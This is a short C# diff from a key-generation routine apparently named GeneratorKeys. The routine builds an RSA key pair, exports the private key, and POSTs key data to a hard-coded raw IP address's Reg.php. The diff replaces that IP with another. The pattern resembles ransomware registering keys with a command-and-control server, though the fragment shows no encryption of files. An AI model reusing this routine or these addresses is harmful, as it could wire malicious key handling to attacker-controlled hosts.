@@ -17,7 +17,7 @@ namespace GeneratorKeys
 			RSACryptoServiceProvider RsaKey = new RSACryptoServiceProvider(2048);
 			string prik = RsaKey.ToXmlString(true);
 			{
-				WebRequest request = WebRequest.Create("http://185.251.38.207/Reg.php");
+				WebRequest request = WebRequest.Create("http://193.178.169.223/Reg.php");
 				request.Method = "POST";
 
 				string mod = Convert.ToBase64String(RsaKey.ExportParameters(false).Modulus);
